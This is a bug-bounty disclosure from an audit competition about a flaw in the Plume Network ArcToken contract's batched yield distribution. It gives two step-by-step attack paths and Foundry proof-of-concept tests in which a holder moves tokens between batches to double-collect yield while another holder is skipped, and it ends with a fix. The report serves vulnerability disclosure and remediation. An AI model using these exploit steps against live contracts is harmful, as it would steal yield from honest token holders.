# 52371 sc high distributeyieldwithlimit is vulnerable to inter batch balance and holders array mutations

**Submitted on Aug 10th 2025 at 09:43:16 UTC by @IronsideSec for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #52371
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcToken.sol>
* **Impacts:** Theft of unclaimed yield

## Description / Brief

An attacker or even genuine token holders can move ARC between batches to receive yield twice for the same underlying stake, while another holder can be omitted due to index-swap semantics. Consequences: attacker gains excess yield at the expense of honest holders (misallocation/stealing of yield), undermining fairness of distributions.

## Vulnerability Details

* Root cause
  * Batching uses a mutable `EnumerableSet` of `holders` and current balances per call; there is no snapshot of the holder list or balances for the epoch.
  * When a holder zeroes their balance, they’re removed and the last element is swapped into their index. New recipients are appended to the end.
  * The next batch uses indices on this mutated set and recomputed balances/denominator, so previously “covered” index ranges no longer correspond to the same addresses.
* Attack path 1 (move-all between batches; omission via index swap; double-dip on new account)
  * Setup 100 holders; attacker at index 6.
  * Admin calls batch 1 with startIndex=1, max=50. Attacker gets paid.
  * Attacker moves all ARC to a new address. This removes attacker; the last holder is swapped into index 6; attacker’s new address is appended (\~index 98).
  * Admin calls batch 2 with startIndex=51, max=50. Attacker’s new address (\~98) gets paid again; the swapped-in holder now at index 6 is omitted for this epoch.
* Attack path 2 (move-all-minus-one wei, between batches; double-pay for same stake)
  * Setup 100 holders; attacker at index 6; friend at index 16.
  * Admin calls batch 1 with startIndex=1, max=10. Attacker gets paid.
  * Attacker transfers all but 1 wei to friend. Attacker stays in set (dust), friend remains at index 16 (next batch range).
  * Admin calls batch 2 with startIndex=11, max=10. Friend gets paid too. Combined payout for attacker’s stake across two addresses exceeds a snapshot-fair pro-rata share for the epoch.
* Proofs
  * Tests demonstrating both behaviors:
    * `test_PoC1_100H_AttackerIdx6_MoveAll_Then51to100()`
    * `test_PoC2_100H_AttackerIdx6_MoveAllMinusOne_ToIdx16()`

Relevant code excerpts:

* Transfer handler that mutates holders set (removal/add):

```solidity
140:     function _update(address from, address to, uint256 amount) internal virtual override {
141:         ArcTokenStorage storage $ = _getArcTokenStorage();
    ---- SNIP ----
179:         if (from != address(0)) {
180:             uint256 fromBalanceBefore = balanceOf(from);
181:             if (fromBalanceBefore == amount) {
182:   >>>           $.holders.remove(from);
183:             }
184:         }
185: 
186:         super._update(from, to, amount);
187: 
188:         if (to != address(0) && balanceOf(to) > 0) {
189:   >>>       $.holders.add(to);
190:         }
191: ...
```

* Distribution entrypoint:

```solidity
570:     function distributeYieldWithLimit(
571:         uint256 totalAmount,
572:         uint256 startIndex,
573:         uint256 maxHolders
574:     )
575:         external
576:         onlyRole(YIELD_DISTRIBUTOR_ROLE)
577:         nonReentrant
578:         returns (uint256 nextIndex, uint256 totalHolders, uint256 amountDistributed)
579:     {
    ---- SNIP ----
677:     }
```

## Impact Details

* Double-dipping: A single stake can receive yield twice by moving between batches, inflating the attacker’s payout beyond fair pro-rata.
* Omission: A honest holder can be skipped in the epoch when swapped into an already-processed index range.
* Zero-sum misallocation: Yield meant for all holders is redistributed unfairly, directly harming honest holders’ payouts. Repeating this each epoch yields ongoing economic loss for others. Severity: High (direct economic impact to holders).

## References / Mitigation suggestion

* Introduce ERC20 pausable feature.
* Pause token transfers when distributor calls multiple `distributeYieldWithLimit`.

## Proof of Concept

{% stepper %}
{% step %}

### Paste tests into repository

1. Paste the following code at the end of `arc/test/ArcToken.t.sol`.
   {% endstep %}

{% step %}

### Run tests

2. Run:

* `forge t --mt test_PoC1_100H_AttackerIdx6_MoveAll_Then51to100 -vvvv --via-ir`
* `forge t --mt test_PoC2_100H_AttackerIdx6_MoveAllMinusOne_ToIdx16 -vvvv --via-ir`
  {% endstep %}
  {% endstepper %}

```solidity
// PoCs exactly per prompt indices and batch sizes
contract ArcTokenYieldPoCs is ArcTokenTest {
    // Helpers to build precise holder ordering
    function _mintMany(address[] memory addrs, uint256 amt) internal {
        for (uint256 i = 0; i < addrs.length; i++) token.mint(addrs[i], amt);
    }

    function test_PoC1_100H_AttackerIdx6_MoveAll_Then51to100() public {
        // Target layout (0-based): [0:owner, 1:alice, 2..5:dummies, 6:attacker, 7..97:dummies, 98:friend, 99:last]
        address attacker = makeAddr("atk1");
        address friend   = makeAddr("atk1_friend_idx98");
        address last     = makeAddr("last_idx99");

        // Fill indices 2..5
        address[] memory d_2to5 = new address[](4);
        for (uint256 i = 0; i < 4; i++) d_2to5[i] = address(uint160(0x1000 + i));
        _mintMany(d_2to5, 1e18);

        // Index 6: attacker
        token.mint(attacker, 10e18);

        // Fill indices 7..97 (91 addrs)
        address[] memory d_7to97 = new address[](91);
        for (uint256 j = 0; j < 91; j++) d_7to97[j] = address(uint160(0x2000 + j));
        _mintMany(d_7to97, 1e18);

        // Index 98: friend; 99: last
        token.mint(friend, 1e18);
        token.mint(last, 1e18);

        // Pre-fund for two batches (startIndex != 0 => no pull)
        uint256 amount = 1e18;
        yieldToken.transfer(address(token), 2 * amount);

        // Batch 1: indices 1..50 (attacker at 6 gets paid)
        token.distributeYieldWithLimit(amount, 1, 50);
        uint256 atkYield1 = yieldToken.balanceOf(attacker);
        assertGt(atkYield1, 0, "attacker must receive in batch 1");

        // Move-all: attacker removed; last swaps into idx 6; friend already sits at idx 98
        uint256 atkBal = token.balanceOf(attacker);
        vm.prank(attacker);
        token.transfer(friend, atkBal);

        // Batch 2: indices 51..100 (friend at 98 gets paid; swapped 'last' now at 6 is omitted)
        token.distributeYieldWithLimit(amount, 51, 50);

        assertGt(yieldToken.balanceOf(friend), 0, "friend (idx 98) must receive in batch 2");
        assertEq(yieldToken.balanceOf(last), 0, "last (moved to idx 6) was skipped this epoch");
    }

    function test_PoC2_100H_AttackerIdx6_MoveAllMinusOne_ToIdx16() public {
        // Target layout (0-based): [0:owner, 1:alice, 2..5:dummies, 6:attacker, 7..15:dummies, 16:friend, ... up to 99]
        address attacker = makeAddr("atk2");
        address friend   = makeAddr("atk2_friend_idx16");

        // Fill indices 2..5
        address[] memory d_2to5 = new address[](4);
        for (uint256 i = 0; i < 4; i++) d_2to5[i] = address(uint160(0x3000 + i));
        _mintMany(d_2to5, 1e18);

        // Index 6: attacker
        uint256 attackerStake = 1_000e18;
        token.mint(attacker, attackerStake);

        // Fill indices 7..15 (9 addrs)
        address[] memory d_7to15 = new address[](9);
        for (uint256 j = 0; j < 9; j++) d_7to15[j] = address(uint160(0x4000 + j));
        _mintMany(d_7to15, 1e18);

        // Index 16: friend
        token.mint(friend, 1e18);

        // Fill remaining up to 99 (to reach 100 holders total)
        address[] memory rest = new address[](100 - (2 + 4 + 1 + 9 + 1)); // 83 addrs
        for (uint256 k = 0; k < rest.length; k++) rest[k] = address(uint160(0x5000 + k));
        _mintMany(rest, 1e18);

        // Pre-fund for two batches
        uint256 amount = 1e18;
        yieldToken.transfer(address(token), 2 * amount);

        // Batch 1: indices 1..10 (attacker at 6 gets paid)
        token.distributeYieldWithLimit(amount, 1, 10);
        uint256 atkYield1 = yieldToken.balanceOf(attacker);
        assertGt(atkYield1, 0, "attacker must receive in batch 1");

        // Move-all-minus-one: attacker stays in set; friend already at idx 16
        uint256 moveAmt = token.balanceOf(attacker) - 1;
        vm.prank(attacker);
        token.transfer(friend, moveAmt);

        // Batch 2: indices 11..20 (friend at 16 gets paid too)
        token.distributeYieldWithLimit(amount, 11, 10);
        uint256 friendYield = yieldToken.balanceOf(friend);
        assertGt(friendYield, 0, "friend (idx 16) must receive in batch 2");
    }
}
```

References to source lines in the repository:

* <https://github.com/immunefi-team/attackathon-plume-network/blob/580cc6d61b08a728bd98f11b9a2140b84f41c802/arc/src/ArcToken.sol#L653-L712>
* <https://github.com/immunefi-team/attackathon-plume-network/blob/580cc6d61b08a728bd98f11b9a2140b84f41c802/arc/src/ArcToken.sol#L466>
